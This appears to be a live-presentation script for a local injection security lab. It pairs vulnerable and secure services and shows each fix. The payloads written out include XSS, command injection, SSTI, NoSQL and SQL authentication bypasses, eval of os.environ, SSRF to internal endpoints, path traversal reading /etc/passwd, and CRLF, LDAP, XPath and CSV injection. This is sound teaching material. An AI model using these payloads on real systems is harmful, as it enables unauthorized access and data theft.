# Demo Script — Injection Security Lab

Step-by-step guide for live demonstration during a presentation.

---

## Prerequisites

```bash
cp .env.example .env
make build
make up
# Wait ~30 seconds for all containers to start
# Open http://localhost:8080 in browser
```

---

## Demo 1 — XSS (5 minutes)

### What to launch
```
http://localhost:5001  (Vulnerable)
http://localhost:5002  (Secure)
```

### Actions — Vulnerable

1. Open `http://localhost:5001`
2. In the Name field, type: `Alice`
3. In the Comment field, type: `<img src=x onerror="document.title='XSS_PROOF'">`
4. Click **Post Comment**

### What to observe
- The page title changes to `XSS_PROOF`
- This proves the browser executed the injected script

### Explanation to audience
> "The application renders the user's comment directly as HTML.
> The browser interprets the onerror event handler and executes it.
> In a real attack, this could steal session cookies or redirect the user."

### Show the correction

5. Open `http://localhost:5002`
6. Submit the same payload
7. Observe: the text `<img src=x onerror=...>` is displayed literally — no execution
8. Point to the page source: `&lt;img src=x onerror=...&gt;` — encoded, not code

---

## Demo 2 — Command Injection (5 minutes)

### What to launch
```
http://localhost:5003  (Vulnerable)
```

### Actions — Vulnerable (using curl or the web form)

```bash
# Normal ping
curl -s http://localhost:5003/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1"}'

# Injection payload
curl -s http://localhost:5003/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; echo INJECTION_DETECTED"}'
```

### What to observe
- First request: normal ping output
- Second request: ping output + `INJECTION_DETECTED` on a new line

### Explanation to audience
> "The ping command is built by concatenating the user's input into a shell string.
> The semicolon `;` is a shell command separator.
> The shell runs both `ping 127.0.0.1` AND `echo INJECTION_DETECTED`."

### Show the correction

```bash
# Same payload against the secure version
curl -s http://localhost:5004/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; echo INJECTION_DETECTED"}'
# Response: {"blocked": true, "error": "Target not in allowlist"}
```

---

## Demo 3 — SSTI (5 minutes)

### What to launch
```
http://localhost:5005/greet?name={{7*7}}   (Vulnerable)
http://localhost:5006/greet?name={{7*7}}   (Secure)
```

### Actions — Vulnerable

1. Open `http://localhost:5005/greet?name={{7*7}}`

### What to observe
- The page shows: `Hello 49!`
- The `{{7*7}}` was evaluated by Jinja2 as an expression

### Explanation to audience
> "The developer built the template string from user input: `f'Hello {name}!'`.
> When name is `{{7*7}}`, the template becomes `Hello {{7*7}}!`
> Jinja2 evaluates `{{7*7}}` and returns 49.
> In real attacks, this can be extended to execute OS commands."

### Show the correction

2. Open `http://localhost:5006/greet?name={{7*7}}`
3. Observe: `Hello {{7*7}}!` — displayed as literal text, not evaluated

---

## Demo 4 — NoSQL Injection (5 minutes)

### What to launch
Use curl (no browser form needed).

### Actions — Vulnerable

```bash
# Normal login
curl -s http://localhost:5007/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "lab_alice_pass"}'
# Result: authenticated

# Wrong password — should fail
curl -s http://localhost:5007/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong"}'
# Result: 401 failed

# INJECTION — $ne operator bypass
curl -s http://localhost:5007/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": null}}'
# Result: authenticated as admin!
```

### Explanation to audience
> "MongoDB's `$ne` operator means 'not equal'.
> The query becomes: find a user where username='admin' AND password != null.
> Since the password field has a value, it's not null → condition is TRUE.
> The attacker logged in without knowing the password."

### Show the correction

```bash
curl -s http://localhost:5008/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": null}}'
# Result: {"blocked": true, "error": "Invalid input"}
```

---

## Demo 5 — Expression Injection (5 minutes)

### What to launch
```
http://localhost:5019/calculate?expression=2+2   (Vulnerable)
http://localhost:5020/calculate?expression=2+2   (Secure)
```

### Actions — Vulnerable

1. Open `http://localhost:5019/calculate?expression=2%2B2` → Result: 4 ✓
2. Open `http://localhost:5019/calculate?expression=%22x%22*3` → Result: xxx (string!)
3. Open `http://localhost:5019/calculate?expression=__import__('os').environ.get('FLASK_ENV','detected')`
   → Result: `development` — environment variable exposed!

### Explanation to audience
> "The application uses Python's `eval()` to calculate expressions.
> eval() accepts any Python expression — not just math.
> The attacker can access runtime environment, import modules, and more.
> In a real scenario without further mitigations, this leads to RCE."

### Show the correction

4. Open `http://localhost:5020/calculate?expression=%22x%22*3`
   → Result: `[BLOCKED] Unsafe node type: Constant` (string rejected)
5. Open `http://localhost:5020/calculate?expression=2%2B2`
   → Result: 4 ✓ (math still works)

---

## Demo 6 — Log Injection (3 minutes)

### Actions — Vulnerable

```bash
# Normal login
curl -s -X POST http://localhost:5015/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice"}'

# Injection — forge a fake successful login for root
curl -s -X POST http://localhost:5015/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice\nINFO 2024-01-01 00:00:01,000 [INFO] Login SUCCESS for user: root"}'

# Check the logs
curl -s http://localhost:5015/api/logs
```

### What to observe
- The log contains a line that says `Login SUCCESS for user: root`
- This was never a real login — it was injected

### Show the correction

```bash
# Same payload against secure
curl -s -X POST http://localhost:5016/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice\nfake"}'
# Result: {"blocked": true} — newline rejected
```

---

## Demo 7 — SQL Injection (5 minutes)

### What to launch
```
http://localhost:5021  (Vulnerable)
http://localhost:5022  (Secure)
```

### Actions — Vulnerable

```bash
# Normal login
curl -s -X POST http://localhost:5021/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "lab_alice_pass"}'

# Tautology bypass
curl -s -X POST http://localhost:5021/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "'\'' OR '\''1'\''='\''1"}'

# UNION injection
curl -s -X POST http://localhost:5021/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' UNION SELECT 1,'\''injected'\'','\''data'\'','\''admin'\''--", "password": "x"}'
```

### What to observe
- Tautology: authenticated as admin without password
- UNION: user "injected" returned from crafted row

### Show the correction

```bash
curl -s -X POST http://localhost:5022/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "'\'' OR '\''1'\''='\''1"}'
# Result: 401 — parameterized query prevents injection
```

---

## Demo 8 — SSRF (5 minutes)

### What to launch
```
http://localhost:5023  (Vulnerable)
http://localhost:5024  (Secure)
```

### Actions — Vulnerable

```bash
# Normal fetch (external URL)
curl -s "http://localhost:5023/api/fetch?url=http://example.com"

# SSRF — access internal metadata
curl -s "http://localhost:5023/api/fetch?url=http://localhost:5000/internal/metadata"

# SSRF — steal the flag
curl -s "http://localhost:5023/api/fetch?url=http://localhost:5000/internal/flag"
```

### What to observe
- The server fetches the internal URL and returns the flag

### Explanation to audience
> "The application fetches any URL the user provides.
> Internal services like `/internal/flag` are not exposed to the network,
> but the server can reach them. The attacker uses the server as a proxy."

### Show the correction

```bash
curl -s "http://localhost:5024/api/fetch?url=http://localhost:5000/internal/flag"
# Result: {"blocked": true, "error": "Domain 'localhost' not in allowlist"}
```

---

## Demo 9 — IDOR (3 minutes)

### What to launch
```
http://localhost:5025  (Vulnerable)
http://localhost:5026  (Secure)
```

### Actions — Vulnerable

```bash
# View own profile (alice, id=1)
curl -s http://localhost:5025/api/user/1

# IDOR — access admin profile (id=3)
curl -s http://localhost:5025/api/user/3
```

### What to observe
- Admin's private notes (containing the flag) are returned

### Explanation to audience
> "The API serves user profiles by ID without checking if the requester owns that profile.
> An attacker can enumerate IDs (1, 2, 3...) and access all users' data."

### Show the correction

```bash
curl -s http://localhost:5026/api/user/3
# Result: {"blocked": true, "error": "Access denied — you can only view your own profile"}
```

---

## Demo 10 — Path Traversal (3 minutes)

### What to launch
```
http://localhost:5027  (Vulnerable)
http://localhost:5028  (Secure)
```

### Actions — Vulnerable

```bash
# Normal file read
curl -s "http://localhost:5027/api/read?file=report-q1.txt"

# Path traversal — read the flag
curl -s "http://localhost:5027/api/read?file=../../../../tmp/flag.txt"

# Read system files
curl -s "http://localhost:5027/api/read?file=../../../../etc/passwd"
```

### What to observe
- The flag file content and system passwd are returned

### Explanation to audience
> "The application joins the user's filename with the base directory using os.path.join().
> The `../` sequences escape the intended directory.
> An attacker can read any file the process has permission to access."

### Show the correction

```bash
curl -s "http://localhost:5028/api/read?file=../../../../tmp/flag.txt"
# Result: {"error": "File not found"} — basename() strips ../
```

---

## Demo 11 — LDAP Injection (3 minutes)

### Actions — Vulnerable

```bash
# Normal search
curl -s "http://localhost:5009/api/search?username=ivan"

# Wildcard injection — dump all users
curl -s "http://localhost:5009/api/search?username=*"
```

### Show the correction

```bash
curl -s "http://localhost:5010/api/search?username=*"
# Result: {"blocked": true} — wildcard rejected
```

---

## Demo 12 — XPath Injection (3 minutes)

### Actions — Vulnerable

```bash
# Normal lookup
curl -s "http://localhost:5011/api/lookup?username=alice"

# Injection — return all users
curl -s "http://localhost:5011/api/lookup?username=%27%20or%20%271%27%3D%271"
```

### Show the correction

```bash
curl -s "http://localhost:5012/api/lookup?username=%27%20or%20%271%27%3D%271"
# Result: {"blocked": true}
```

---

## Demo 13 — CSV Injection (3 minutes)

### Actions — Vulnerable

```bash
# Normal export
curl -s -X POST http://localhost:5013/api/export \
  -H "Content-Type: application/json" \
  -d '{"entries":[{"name":"Alice","email":"alice@test.com","company":"ACME"}]}'

# Formula injection
curl -s -X POST http://localhost:5013/api/export \
  -H "Content-Type: application/json" \
  -d '{"entries":[{"name":"=SUM(1+1)","email":"test@t.com","company":"X"}]}'
```

### Show the correction

```bash
curl -s -X POST http://localhost:5014/api/export \
  -H "Content-Type: application/json" \
  -d '{"entries":[{"name":"=SUM(1+1)","email":"test@t.com","company":"X"}]}'
# Formulas prefixed with tab character
```

---

## Demo 14 — Header/CRLF Injection (3 minutes)

### Actions — Vulnerable

```bash
# Normal
curl -s "http://localhost:5017/api/set-lang?lang=fr"

# CRLF injection
curl -s "http://localhost:5017/api/set-lang?lang=en%0d%0aX-Injected:%20true"
```

### Show the correction

```bash
curl -s "http://localhost:5018/api/set-lang?lang=en%0d%0aX-Injected:%20true"
# Result: {"blocked": true}
```

---

## Closing Summary

| Lab | Vulnerability | Proof | Fix |
|-----|--------------|-------|-----|
| XSS | Raw HTML output | Script executed | Jinja2 auto-escape |
| Command | shell=True + concat | Extra command ran | List args, no shell |
| SSTI | User as template | `{{7*7}}` = 49 | Fixed template |
| NoSQL | No type check | `$ne` bypasses auth | Pydantic schema |
| Log | String concat | Fake log entry | Structured logging |
| Expression | eval() | `"x"*3` works | AST math parser |
| SQL | String concat | `' OR '1'='1` bypass | Prepared statements |
| SSRF | No URL validation | Internal flag leaked | URL allowlist |
| IDOR | No auth check | Admin profile exposed | Per-request auth |
| Path Traversal | No path validation | `/etc/passwd` read | basename + realpath |
| LDAP | No escaping | `*` dumps all users | RFC 4515 escaping |
| XPath | String concat | `' or '1'='1` dump | Allowlist validation |
| CSV | Raw formula cells | Formula active | Tab prefix sanitize |
| Header | No CRLF strip | Header injected | CRLF rejection |

> **Core message:** The fix is always to separate data from code.
> Use APIs designed for this separation, not string concatenation.
